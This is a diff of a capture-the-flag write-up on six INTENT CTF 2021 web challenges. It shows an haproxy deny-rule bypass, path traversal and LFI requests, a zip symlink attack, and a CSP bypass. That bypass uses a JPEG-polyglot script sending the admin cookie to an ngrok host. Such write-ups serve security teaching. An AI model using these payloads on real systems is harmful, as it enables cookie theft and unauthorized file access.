@@ -1,12 +1,12 @@
-# INTENT CTF 2021
+# INTENT CTF 2021 - Writeups (6-in-1)
 
 ![Logo](img/Intent_logo.png)
 
 [INTENT Security Research Summit 2021](https://intentsummit.org/) was founded by security companies CyberArk and Checkmarx and is focused on security research. 
 
-I played (most of) their web challenges and I thought they were simple, but very creative. 
+I played (most of) their web challenges and I thought they were simple, but very creative and fun. Personally, my prefferred was ```Darknet Club```. 
 
-In this write-up, I'll make a fast-pass on the solved challenges, with less details than usual.
+In this write-up, I'll make a fast-pass on the 6 solved challenges, with a little less details than usual. 
 
 ![solved-challenges](img/solved-challenges.png)
 
@@ -42,9 +42,9 @@ backend websrvs
 
 While searching a little bit, I confirmed my suspicion that it is an haproxy configuration file. 
 
-We have an haproxy in front of an internal server (flask:5000). There is a /flag endpoint, which is our obvious target, but it is externally blocked by the two **http-request deny**:
+We have an haproxy in front of an internal server (```flask:5000```). There is a ```/flag``` endpoint, which is our obvious target, but it is externally blocked by the two ```http-request deny```:
 
-1. The first blocks any request starting with **/flag**
+1. The first blocks any request starting with ```/flag```
 2. The second blocks any request that, after urldecoding, matches the regex bellow.
 
 ```
@@ -53,7 +53,7 @@ We have an haproxy in front of an internal server (flask:5000). There is a /flag
 
 Let's take a look:
 
-```
+```html
 $ curl http://door-unlocked.chal.intentsummit.org:8000/flag
 <html><body><h1>403 Forbidden</h1>
 Request forbidden by administrative rules.
@@ -70,7 +70,7 @@ $ nc -l -p 5000 < netcat.response.http
 
 At first, let's comment the regex line to understand the first protection.
 
-```
+```bash
 http-request deny if { path_beg /flag }
 # http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
 ```
@@ -89,11 +89,11 @@ $ curl --path-as-is http://localhost:8000/./flag
 Bypassed!
 ```
 
-We just changed **/flag** to **/./flag** (shame on you). Note that I used the --path-as-is flag on curl to avoid normalization on the client-side.
+We just changed ```/flag*``` to ```/./flag``` (shame on you). Note that I used the ```--path-as-is``` flag on curl to avoid normalization on the client-side.
 
 Let's invert the the comments to test the regex bypass:
 
-```
+```bash
 # http-request deny if { path_beg /flag }
 http-request deny if { path,url_dec -m reg ^.*/?flag/?.*$ }
 ```
@@ -109,19 +109,18 @@ At first, it looks like anything with the word "flag" inside the URL would be bl
 So... what about sending a line terminator?
 (Note that I'm keeping the the first bypass in the game)
 
-```
+```html
 # Normal block
 $ curl --path-as-is http://localhost:8000/./flag
 <html><body><h1>403 Forbidden</h1>
 Request forbidden by administrative rules.
-</body></html>
-$ 
-$ # Bypass
+</body></html> 
+# Bypass
 $ curl --path-as-is http://localhost:8000/./%0a/../flag
 Bypassed!
 ```
 
-Pretty nice, it accepted our %0A (ASCII Line Feed) and, since it does not match the "```.*```", it bypassed the regex.
+Pretty nice, it accepted our ```%0A``` (ASCII Line Feed) and, since it does not match the ```.*```, it bypassed the regex.
 
 Now, get the flag in the real server:
 
@@ -183,7 +182,7 @@ In summary:
 
 ## Hacking
 
-It is pretty clear that we have to get the flag.name file and, using the value, getting the flag file inside tmp.
+It is pretty clear that we have to get the flag.name file and, using the value, getting the flag file inside /tmp.
 The obvious flaw of the app is the [LFI - Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), which I explained in a recent write-up: [ASISCTF 2021 - ASCII art as a service](https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/)
 
 Let's first get the **flag.name** file, using the **/files/images/:name**. Let's try [path traversal](https://owasp.org/www-community/attacks/Path_Traversal) here:
@@ -202,7 +201,7 @@ $ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/../..
 </html>
 ```
 
-This message means the express app does not found any GET route with this pattern. This happens because we broke the pattern **/files/images/:name**. If we just urlencode the :name, it works>
+This message means the express app did not found a GET route with this pattern. This happens because we broke the pattern ```/files/images/:name```. If we just url-encode the :name, it works.
 
 ```html
 $ curl -k --path-as-is https://etulosba.chal.intentsummit.org/files/images/..%2f..%2fflag.name
@@ -267,9 +266,6 @@ Let's add our zipped resumee to test it:
 $ cat resumee-nep1.txt 
 Name: nep1
 
-$ cat resumee-nep1.txt 
-Name: nep1
-
 $ zip resumee-nep1.zip resumee-nep1.txt
   adding: resumee-nep1.txt (stored 0%)
 ```
@@ -278,12 +274,12 @@ It created a link for me: ```https://careers.chal.intentsummit.org/upload/9b2b4b
 
 ![Logo](img/careers-upload-1.png)
 
-And clickling the generated link (```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f/resumee-nep1.txt```) I could see the original resumee txt file.
+And clickling the generated link (```https://careers.chal.intentsummit.org/upload/9b2b4b582c3df097c6c5b3fea68c8d1f/resumee-nep1.txt```), I could see the original resumee txt file.
 
 Other findings:
-* If I generated a zip with multiple files, it would show them.
+* If I generated a zip with multiple files, it will show them in the list.
 * It only showed ```.txt``` files.
-* The files with other extensions (like .php) weren't in the directory (acessing directly without the link).
+* The files with other extensions (like ```.php```) weren't in the directory (acessing directly without the link).
 
 ## Hacking
 
@@ -300,7 +296,7 @@ So, let's create the payload.
 $ echo flag{fake} | sudo tee /flag
 flag{fake}
 
-neptunian:~/ctf/intent-ctf-2021/web/writeup/careers$ cat /flag
+$ cat /flag
 flag{fake}
 
 # create the poisoned symlink
@@ -403,8 +399,7 @@ As thought by the master-hacker [Orange Tsai](https://twitter.com/orange_8361), 
 
 I explain a little bit of it in the writeup [redpwnCTF 2021 - Requester + Requester Strikes Back](https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/).
 
-We can have this (incomplete/simplified) format:
-http://user@domain/path?querystring
+We can have this (incomplete/simplified) URL format: ```http://user@domain/path?querystring```
 
 If we put an "```@```" before the querystring, we can make the admin browser think the ```location.origin``` is an username instead of the domain. 
 
@@ -412,7 +407,7 @@ Let's simulate it, using my ngrok endpoint:
 
 ```http://flag-vault.chal.intentsummit.org/?redirect=@c292-201-17-126-102.ngrok.io/admin```
 
-Look what we got:
+Look what we got if we send it to the report page:
 
 ![flag-vault-page](img/flag-vault-got-token.png)
 
@@ -509,7 +504,7 @@ $ curl -k https://mass-notes.chal.intentsummit.org/avatar/619425b3989bedd8dfa702
 Error: ENOENT: no such file or directory, open '/app/avatars/neptunian.png'
 ```
 
-Yeah! The errors tells us that it is trying to open a file called neptunian.png and didn't found it. We have an LFI!
+Yeah! The errors tells us that it is trying to open a file called ```neptunian.png``` (name that we control) and didn't found it. We have an LFI!
 
 Let's create another note, pointing our file to the possible flag location. We also know the default path is /app/avatars, so we need to get up two levels in our path traversal.
 
@@ -553,13 +548,13 @@ We need to try a [XSS](https://owasp.org/www-community/attacks/xss/) here.
 
 After changing all fields, we see that the ```Referral``` is not sanitized and, at first, vulnerable to XSS:
 
-Let's try adding a HTML and scripting to it:
+Let's edit the profile and change the Referral, adding a script:
 
 ```html
 <strong>Admin</strong><script>alert(1);</script>
 ```
 
-The ```Admin``` got bold with the strong tag, but no alert fired. This errors happens in the Javascript side:
+The ```Admin``` got bold with the strong tag, but no alert fired. This errors happens in the Javascript execution:
 
 ```Refused to execute inline script because it violates the following Content Security Policy directive: "default-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-5jFwrAK0UV47oFbVg/iCCBbxD8X1w+QvoOUepu4C2YA='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.```
 
@@ -602,12 +597,11 @@ We can't just send a random jpeg with in the middle of the text. It wont work.
 
 There is a VERY interesting article, by [Gareth Heyes](https://twitter.com/garethheyes), on [Bypassing CSP using polyglot JPEGs
 ](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs). 
-
-This is not the article we want, but it is the article we need.
+It is not the article we want, but it is the article we need.
 
 ![batman](img/batman.jpg)
 
-This is great but we need only to solve a subset of Gareth's problem. We don't need a full polyglot jpeg but just the first part. It turns out the JPEG signature can be used as a valid variable name in Javascript. We can have a first line like this:
+This is great but we only need to solve a subset of Gareth's problem. We don't need a full polyglot jpeg but just the first part. It turns out the JPEG signature can be used as a valid variable name in Javascript. We can have a first line like this:
 
 ```javascript
 jpeg_signature=1;
@@ -630,7 +624,7 @@ out.write(payload)
 out.close()
 ```
 
-For the actual Javascript payload. I tried to first make a fetch my URL with the admin cookie, but fetching other domain is blocked by CSP. We can bypass it by redirecting the browser page to our domain.
+For the actual Javascript payload. I tried to first make a fetch for my URL with the admin cookie, but fetching other domain is also blocked by the CSP. We can bypass it by redirecting the browser page to our domain.
 
 ```javascript
 window.location.href = 'http://66e9-201-17-126-102.ngrok.io/flag?'+encodeURIComponent(document.cookie);
@@ -640,7 +634,7 @@ Let's generate our payload and upload it.
 
 ```
 $ python inject.py 
-neptunian:~/ctf/intent-ctf-2021/web/writeup/darknet-club$ hexdump -C jpeg-payload.js 
+$ hexdump -C jpeg-payload.js 
 00000000  ff d8 ff 3d 31 3b 77 69  6e 64 6f 77 2e 6c 6f 63  |...=1;window.loc|
 00000010  61 74 69 6f 6e 2e 68 72  65 66 20 3d 20 27 68 74  |ation.href = 'ht|
 00000020  74 70 3a 2f 2f 36 36 65  39 2d 32 30 31 2d 31 37  |tp://66e9-201-17|
@@ -669,7 +663,7 @@ $ curl -k https://darknet-club.chal.intentsummit.org/api/avatar/nep3 | hexdump -
 0000006d
 ```
 
-It's our payload. Now, let's change the referral to call our javascript:
+It's our payload. Now, let's change the Referral field again to call our javascript:
 
 ```html
 <strong>Admin</strong><script charset="ISO-8859-1"  type="text/javascript" src="/api/avatar/nep3"></script>
